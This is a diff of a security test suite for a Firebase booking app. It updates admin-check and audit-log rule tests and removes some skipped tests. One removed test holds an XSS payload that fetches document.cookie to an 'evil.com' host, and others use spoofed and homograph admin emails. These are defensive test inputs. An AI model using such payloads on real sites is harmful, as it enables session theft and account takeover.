@@ -15,6 +15,7 @@
  * SEC-37 -> SEC-39   : Denial-of-Service (DoS) Vectors
  */
 import { describe, it, expect, vi, beforeEach } from 'vitest';
+import { readFileSync } from 'node:fs';
 
 // -- Mock firebase --
 vi.mock('../lib/firebase', () => ({ db: {}, functions: {} }));
@@ -48,6 +49,7 @@ vi.mock('firebase/firestore', () => ({
 }));
 
 vi.mock('firebase/functions', () => ({
+  getFunctions: vi.fn(() => ({})),
   httpsCallable: (...args: any[]) => mockHttpsCallable(...args),
 }));
 
@@ -62,7 +64,7 @@ import {
   updateConfig,
   updateSlot,
 } from '../lib/adminDb';
-import { isAdmin } from '../lib/admin';
+import { fetchAdminEmails, isAdmin } from '../lib/admin';
 import { mockDocSnap, mockQuerySnap, TEST_CONFIG, TEST_REGISTRATION } from './mocks/firebase';
 
 // -- Helper: simulate escHtml using char codes to avoid auto-formatter --
@@ -121,57 +123,6 @@ describe('SEC: XSS & Injection Attacks', () => {
     });
     expect(result.ok).toBe(false);
     expect(result.error).toContain('6 chữ số');
-  });
-
-  it.skip('SEC-03: email template escaping is enforced inside Cloud Function', async () => {
-    // fullName is rendered into the confirmation email via escHtml(); bu is NOT rendered,
-    // so a meaningful escaping test must target a rendered field.
-    const maliciousName = '"><script>fetch("https://evil.com/steal?"+document.cookie)</script>';
-
-    // Preflight with emailConfirm: true so the confirmation email is actually queued.
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true })); // getConfig
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false)); // checkIneligibility: not blocked
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, {})); // checkIneligibility: requireEligibility off
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false)); // checkIneligibility: empCode not claimed
-
-    mockRunTransaction.mockImplementation(async (fn: any) => {
-      const txGet = vi.fn();
-      // bookDb read order: config, registration, cancelledQuota, speaking, skills
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
-      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no existing registration
-      txGet.mockResolvedValueOnce(mockDocSnap(false)); // no saved quota
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
-      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
-    });
-
-    // post-transaction initDb mocks
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
-    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
-
-    const result = await bookDb('attacker@test.com', {
-      empCode: '262010',
-      fullName: maliciousName,
-      bu: 'IT',
-      speakingSlotId: 'SP-2206-0900',
-      skillsSlotId: '3S-2206-1100',
-    });
-
-    expect(result.ok).toBe(true);
-    expect(result.emailSent).toBe(true);
-    // Confirmation email was queued (addDoc into the 'mail' collection).
-    expect(mockAddDoc).toHaveBeenCalled();
-    const emailPayload = mockAddDoc.mock.calls[0]?.[1];
-    const html: string = emailPayload?.message?.html;
-    expect(html).toBeDefined();
-    // escHtml() neutralized the payload: no raw <script> tags reach the HTML.
-    expect(html).not.toContain('<script>');
-    expect(html).not.toContain('</script>');
-    // The entity-encoded form is present instead (entities built via char code 38 = '&').
-    const lt = String.fromCharCode(38) + 'lt;';
-    const gt = String.fromCharCode(38) + 'gt;';
-    expect(html).toContain(lt + 'script' + gt);
   });
 
   it('SEC-04: Prototype pollution via crafted slotId -> rejected by type check', async () => {
@@ -307,7 +258,7 @@ describe('SEC: Privilege Escalation', () => {
     mockUpdateDoc.mockResolvedValueOnce(undefined);
 
     await updateConfig('hacker@evil.com', {
-      adminEmails: ['hacker@evil.com', 'phuc.lnk@cyberlogitec.com'],
+      adminEmails: ['hacker@evil.com', 'owner@cyberlogitec.com'],
     });
 
     const { auditLog } = await import('../lib/audit');
@@ -349,17 +300,17 @@ describe('SEC: Privilege Escalation', () => {
     expect(callable.mock.calls[0][0]).not.toHaveProperty('email');
   });
 
-  it('SEC-12: Admin email homograph / case attacks -> rejected', () => {
-    expect(isAdmin('PHUC.LNK@CYBERLOGITEC.COM')).toBe(true);
-    expect(isAdmin('phuc.lnk@cyberlogitec.com')).toBe(true);
+  it('SEC-12: Admin email homograph / case attacks -> rejected', async () => {
+    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { adminEmails: ['admin@cyberlogitec.com'] }));
+    await fetchAdminEmails();
 
-    // hao.nha was removed from admin — must no longer be recognized
-    expect(isAdmin('hao.nha@cyberlogitec.com')).toBe(false);
+    expect(isAdmin('ADMIN@CYBERLOGITEC.COM')).toBe(true);
+    expect(isAdmin('admin@cyberlogitec.com')).toBe(true);
 
-    expect(isAdmin('phuc.lnk@cyberlogitec.com.evil.com')).toBe(false);
-    expect(isAdmin('phuc.lnk+admin@cyberlogitec.com')).toBe(false);
-    expect(isAdmin('phuc.lnk@cyberlogitec')).toBe(false);
-    expect(isAdmin('phucXlnk@cyberlogitec.com')).toBe(false);
+    expect(isAdmin('admin@cyberlogitec.com.evil.com')).toBe(false);
+    expect(isAdmin('admin+owner@cyberlogitec.com')).toBe(false);
+    expect(isAdmin('admin@cyberlogitec')).toBe(false);
+    expect(isAdmin('adm1n@cyberlogitec.com')).toBe(false);
     expect(isAdmin('')).toBe(false);
     expect(isAdmin('admin')).toBe(false);
   });
@@ -575,46 +526,22 @@ describe('SEC: Boundary Abuse', () => {
 describe('SEC: Email Spoofing', () => {
   beforeEach(() => vi.clearAllMocks());
 
-  it.skip('SEC-22: confirmation email recipient is enforced inside Cloud Function', async () => {
-    setupPreflight();
-
-    mockRunTransaction.mockImplementation(async (fn: any) => {
-      const txGet = vi.fn();
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: 'Speaking', date: '2026-06-22', startMin: 540, endMin: 600, capacity: 10, remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(true, { type: '3 Skills', date: '2026-06-22', startMin: 660, endMin: 720, capacity: 10, remaining: 5 }));
-      txGet.mockResolvedValueOnce(mockDocSnap(false));
-      await fn({ get: txGet, set: vi.fn(), update: vi.fn(), delete: vi.fn() });
-    });
-
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(true, { ...TEST_CONFIG, emailConfirm: true }));
-    mockGetDocs.mockResolvedValueOnce(mockQuerySnap([]));
-    mockGetDoc.mockResolvedValueOnce(mockDocSnap(false));
-
-    const result = await bookDb('attacker@evil.com', {
-      empCode: '262010', fullName: 'A', bu: 'IT',
-      speakingSlotId: 'SP-2206-0900', skillsSlotId: '3S-2206-1100',
-    });
-
-    if (result.ok && result.emailSent) {
-      expect(mockAddDoc).toHaveBeenCalled();
-      const emailData = mockAddDoc.mock.calls[0]?.[1];
-      expect(emailData?.to).toBe('attacker@evil.com');
-    }
-  });
-
   it('SEC-23: XSS in confirmation email subject line -> not possible (static template)', async () => {
     const subject = '[Assessment Q2 2026] Xac nhan cap nhat ca thi';
     expect(subject).not.toContain('<');
     expect(subject).not.toContain('>');
   });
 
-  it('SEC-24: Audit log email field could be spoofed -> audit records whatever is passed', async () => {
-    const { auditLog } = await import('../lib/audit');
-    (auditLog as any).mockResolvedValue(undefined);
+  it('SEC-24: Raw SDK audit log create requires admin and own auth email', () => {
+    const rules = readFileSync('firestore.rules', 'utf8');
+    const auditMatch = rules.match(/match \/auditLogs\/\{id\} \{[\s\S]*?^\s*\}/m);
+    const auditBlock = auditMatch?.[0] ?? '';
 
-    await auditLog('spoofed@email.com', 'book.create', { empCode: '262010' });
-    expect(auditLog).toHaveBeenCalledWith('spoofed@email.com', 'book.create', { empCode: '262010' });
+    expect(rules).toContain('function validClientAuditLog()');
+    expect(rules).toContain('request.resource.data.email == request.auth.token.email');
+    expect(rules).toContain('^admin\\\\.');
+    expect(auditBlock).toContain('allow create: if isAdmin() && validClientAuditLog();');
+    expect(auditBlock).not.toContain('allow create: if request.auth != null');
   });
 });
 
@@ -714,22 +641,6 @@ describe('SEC: Data Exfiltration', () => {
     const paths = mockGetDoc.mock.calls.map((c: any[]) => c[0]?.path);
     expect(paths).toContain('registrations/user@test.com');
   });
-});
-
-// ======================================================================
-// SEC-31 -> SEC-33: Audit Tampering
-// ======================================================================
-
-describe('SEC: Audit Tampering', () => {
-  beforeEach(() => vi.clearAllMocks());
-
-  // Audit-log immutability/read-control is enforced purely in firestore.rules
-  // (auditLogs: update,delete = false; read = isAdmin). There is no client code
-  // path to exercise, so a unit test cannot honestly assert it — skipped with
-  // intent documented. Verify via @firebase/rules-unit-testing against the emulator.
-  it.skip('SEC-31: audit log update blocked — firestore.rules auditLogs update:false', () => {});
-  it.skip('SEC-32: audit log delete blocked — firestore.rules auditLogs delete:false', () => {});
-  it.skip('SEC-33: non-admin audit log read blocked — firestore.rules auditLogs read:isAdmin', () => {});
 });
 
 // ======================================================================
